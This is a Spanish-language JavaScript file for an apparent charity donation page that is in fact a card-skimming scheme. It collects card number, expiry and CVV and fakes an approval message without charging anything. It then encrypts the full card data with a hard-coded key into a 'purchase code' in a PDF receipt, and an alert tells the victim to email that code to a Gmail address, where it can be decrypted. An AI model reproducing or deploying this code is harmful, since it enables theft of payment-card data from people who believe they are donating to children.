function mostrarFormulario() {
    document.getElementById("formulario").classList.remove("hidden");
}

function formatearTarjeta(input) {
    input.value = input.value.replace(/\D/g, '')
        .replace(/(.{4})/g, '$1 ')
        .trim()
        .substring(0, 19);
}

function validarFecha(input) {
    input.value = input.value.replace(/\D/g, '').substring(0, 4);
    if (input.value.length >= 2) {
        input.value = input.value.substring(0, 2) + '/' + input.value.substring(2, 4);
    }
}

function validarCVV(input) {
    input.value = input.value.replace(/\D/g, '').substring(0, 3);
}

function confirmarDonacion(event) {
    event.preventDefault();
    
    const tarjeta = document.getElementById("tarjeta").value.replace(/\s/g, '');
    const fecha = document.getElementById("fecha").value;
    const cvv = document.getElementById("cvv").value;
    const errorMsg = document.getElementById("error-msg");

    if (!/^\d{16}$/.test(tarjeta)) {
        errorMsg.textContent = "Número de tarjeta inválido. Debe tener 16 dígitos.";
        errorMsg.classList.remove("hidden");
        return false;
    }

    if (!/^\d{2}\/\d{2}$/.test(fecha)) {
        errorMsg.textContent = "Fecha inválida. Use el formato MM/AA.";
        errorMsg.classList.remove("hidden");
        return false;
    }

    let mes = parseInt(fecha.split("/")[0], 10);
    let año = parseInt(fecha.split("/")[1], 10) + 2000;
    let fechaActual = new Date();
    let añoActual = fechaActual.getFullYear();
    let mesActual = fechaActual.getMonth() + 1;

    if (mes < 1 || mes > 12 || año < añoActual || (año === añoActual && mes < mesActual)) {
        errorMsg.textContent = "Fecha de vencimiento inválida.";
        errorMsg.classList.remove("hidden");
        return false;
    }

    if (!/^\d{3}$/.test(cvv)) {
        errorMsg.textContent = "CVV inválido. Debe tener 3 dígitos.";
        errorMsg.classList.remove("hidden");
        return false;
    }

    errorMsg.classList.add("hidden");

    const datos = { tarjeta, fecha, cvv };
    localStorage.setItem('donacion', JSON.stringify(datos));

    setTimeout(() => {
        mostrarAlerta("✅ Donación aprobada. ¡Gracias!");
    }, 3000);

    setTimeout(() => {
        document.getElementById("btnDescargarPDF").style.display = "inline-block";
    }, 3000);

    setTimeout(() => {
        mostrarAlerta("🔑 Envia el código de compra a fundacionfelices@gmail.com para comprobar tu donación");
    }, 6000);

    return true;
}

function mostrarAlerta(mensaje) {
    let alerta = document.createElement("div");
    alerta.classList.add("alert");
    alerta.textContent = mensaje;
    
    document.body.appendChild(alerta);

    setTimeout(() => alerta.classList.add("show"), 100);
    setTimeout(() => {
        alerta.classList.remove("show");
        setTimeout(() => alerta.remove(), 500);
    }, 3000);
}

function encriptarDatos(datos) {
    const claveSecreta = "MiClaveSegura123";
    return CryptoJS.AES.encrypt(datos, claveSecreta).toString();
}

function generarPDF() {
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();

    const datos = localStorage.getItem('donacion');
    if (!datos) {
        alert('No hay datos de donación guardados.');
        return;
    }

    const datosObj = JSON.parse(datos);

    const codigoCompra = encriptarDatos(JSON.stringify(datosObj)).match(/.{1,40}/g).join(" \n");

    doc.setFont("helvetica", "bold");
    doc.setFontSize(18);
    doc.text("Fundación Niños Felices", 20, 20);

    doc.setFont("helvetica", "normal");
    doc.setFontSize(14);
    doc.text("Gracias por tu generosa donación", 20, 30);

    doc.setFontSize(12);
    doc.text("Fecha de la donación: " + new Date().toLocaleDateString(), 20, 40);
    doc.text("Monto donado: $1", 20, 50);
    doc.text("Beneficiario: Fundación Niños Felices", 20, 60);
    doc.text("Tarjeta utilizada: **** **** **** " + datosObj.tarjeta.slice(-4), 20, 70);

    doc.setFont("helvetica", "bold");
    doc.text("Código de compra (haz clic para copiar):", 20, 80);
    doc.setFont("helvetica", "normal");

    doc.setTextColor(0, 0, 255);
    const lineasCodigo = doc.splitTextToSize(codigoCompra, 180);
    doc.textWithLink(lineasCodigo.join(" \n"), 20, 90, {
        url: "javascript:copiarCodigo('" + codigoCompra.replace(/\n/g, '') + "')"
    });
    
    doc.setFontSize(10);
    doc.text("www.fundacionninosfelices.org", 20, 270);
    doc.text("¡Gracias por tu apoyo!", 20, 280);

    doc.save("donacion_fundacion.pdf");
}

function copiarCodigo(codigo) {
    navigator.clipboard.writeText(codigo).then(() => {
        alert("Código copiado al portapapeles");
    }).catch(err => {
        console.error("Error al copiar el código", err);
    });
}